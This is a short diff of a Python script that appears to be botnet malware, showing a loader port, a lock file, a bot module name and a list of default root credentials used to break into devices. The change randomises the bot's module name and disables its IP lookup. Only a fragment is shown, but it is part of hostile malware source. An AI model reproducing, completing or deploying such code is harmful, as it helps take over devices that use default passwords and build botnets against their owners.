@@ -32,7 +32,7 @@ LOADER_PORT = 8000
 MY_IP = "0.0.0.0"
 LOCK_FILE = '/tmp/b'
 
-MODULE = 'bot_'
+MODULE = 'bot_'+str(randint(9999,99999))
 
 CRED_LIST = [
     ("root","password"),
@@ -415,7 +415,7 @@ def get_my_ip():
     MY_IP = f.read().rstrip()
     MODULE = 'bot_'+MY_IP
 
-get_my_ip()
+#get_my_ip()
 
 signal.signal(signal.SIGHUP, signal.SIG_IGN)
 signal.signal(signal.SIGINT, int_handler)
